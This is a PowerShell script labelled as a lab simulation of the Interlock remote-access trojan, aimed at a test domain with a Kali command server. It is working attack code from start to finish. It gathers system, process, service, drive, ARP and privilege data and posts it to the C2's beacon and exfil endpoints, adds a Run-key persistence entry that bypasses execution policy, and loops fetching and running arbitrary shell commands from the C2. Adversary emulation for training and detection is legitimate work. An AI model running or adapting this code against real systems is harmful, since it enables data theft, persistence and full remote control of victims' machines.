# ============================================
# Simulated Interlock RAT — rat.ps1 (PHP variant behavior)
# Source: lab manual §4.2 — /var/www/html/rat.ps1
# Lab: capsulecorp.local | Target: Goku-mak | C2: Kali (10.0.20.50:8080)
#
# Three execution phases reproduced from the DFIR Report variant:
#   PHASE 1 — Automated discovery (systeminfo, tasklist, services, drives, ARP, privilege)
#             Results are sent to /beacon and /exfil immediately on launch.
#   PHASE 2 — Persistence via HKCU Run key (InterlockSim → wefs.cfg in %APPDATA%\php)
#   PHASE 3 — C2 beacon loop polling /cmd every 30 seconds for hands-on-keyboard commands.
#
# Educational/lab use only.
# ============================================
$C2 = 'http://10.0.20.50:8080'
$BEACON_INTERVAL = 30

Write-Host '[*] Interlock RAT Simulation Starting...'
Write-Host "[*] C2 Server: $C2"
Write-Host "[*] Running as: $env:USERDOMAIN\$env:USERNAME"

# ========== PHASE 1: AUTOMATED DISCOVERY ==========
# Exact commands from the DFIR report
Write-Host '[*] Running automated discovery...'

$sysinfo  = cmd /c 'powershell -c "systeminfo /FO CSV | ConvertFrom-Csv | ConvertTo-Json"'
$tasks    = cmd /c 'powershell -c "tasklist /svc /FO CSV | ConvertFrom-Csv | ConvertTo-Json"'
$services = cmd /c 'powershell -c "Get-Service | Select-Object Name,DisplayName | ConvertTo-Json"'
$drives   = cmd /c 'powershell -c "Get-PSDrive -PSProvider FileSystem | ConvertTo-Json"'
$arp      = cmd /c 'powershell -c "Get-NetNeighbor -AddressFamily IPv4 | Where-Object {$_.State -ne ''Permanent''} | Select-Object @{Name=''Interface'';Expression={$_.InterfaceAlias}},@{Name=''Internet Address'';Expression={$_.IPAddress}},@{Name=''Physical Address'';Expression={$_.LinkLayerAddress}},@{Name=''Type'';Expression={''dynamic''}} | ConvertTo-Json"'
$priv     = cmd /c 'powershell -c "if([Security.Principal.WindowsIdentity]::GetCurrent().Name -match ''(?i)SYSTEM''){''SYSTEM''}elseif(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){''ADMIN''}else{''USER''}"'

Write-Host '[+] Discovery complete. Sending beacon...'

# Send initial beacon
$beaconData = @{
    hostname  = $env:COMPUTERNAME
    domain    = $env:USERDOMAIN
    fqdn      = 'goku-mak.capsulecorp.local'
    user      = $env:USERNAME
    privilege = $priv
    ip        = '10.0.10.200'
} | ConvertTo-Json
try { Invoke-RestMethod -Uri "$C2/beacon" -Method POST -Body $beaconData -ContentType 'application/json' }
catch { Write-Host '[-] Beacon failed' }

# Exfiltrate discovery data
Write-Host '[*] Exfiltrating discovery data...'
$exfilData = @{
    systeminfo = $sysinfo
    tasklist   = $tasks
    services   = $services
    drives     = $drives
    arp        = $arp
    privilege  = $priv
} | ConvertTo-Json -Depth 5
try { Invoke-RestMethod -Uri "$C2/exfil" -Method POST -Body $exfilData -ContentType 'application/json' }
catch { Write-Host '[-] Exfil failed' }
Write-Host '[+] Exfiltration complete.'

# ========== PHASE 2: PERSISTENCE ==========
# Registry Run key pointing to C:\Users\Gokuadm-mak\AppData\Roaming\php\wefs.cfg
Write-Host '[*] Establishing persistence via Registry Run key...'
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v InterlockSim /t REG_SZ /d "powershell.exe -ep Bypass -File C:\Users\Gokuadm-mak\AppData\Roaming\php\wefs.cfg" /f
Write-Host '[+] Registry Run key created: HKCU\...\Run\InterlockSim'

# ========== PHASE 3: C2 BEACON LOOP ==========
Write-Host "[*] Entering beacon loop (${BEACON_INTERVAL}s interval)..."
Write-Host '[*] Press Ctrl+C to stop.'

while ($true) {
    try {
        $response = Invoke-RestMethod -Uri "$C2/cmd" -Method GET
        switch ($response.command) {
            'CMD' {
                Write-Host "[>] Executing: $($response.payload)"
                $output = cmd /c $response.payload 2>&1 | Out-String
                $resultData = @{ output = $output; command = $response.payload } | ConvertTo-Json
                Invoke-RestMethod -Uri "$C2/result" -Method POST -Body $resultData -ContentType 'application/json'
                Write-Host '[+] Result sent to C2'
            }
            'OFF' {
                Write-Host '[!] OFF command received. Shutting down.'
                exit 0
            }
            'NONE' { }
        }
    }
    catch { Write-Host "[-] C2 failed: $($_.Exception.Message)" }
    Start-Sleep -Seconds $BEACON_INTERVAL
}
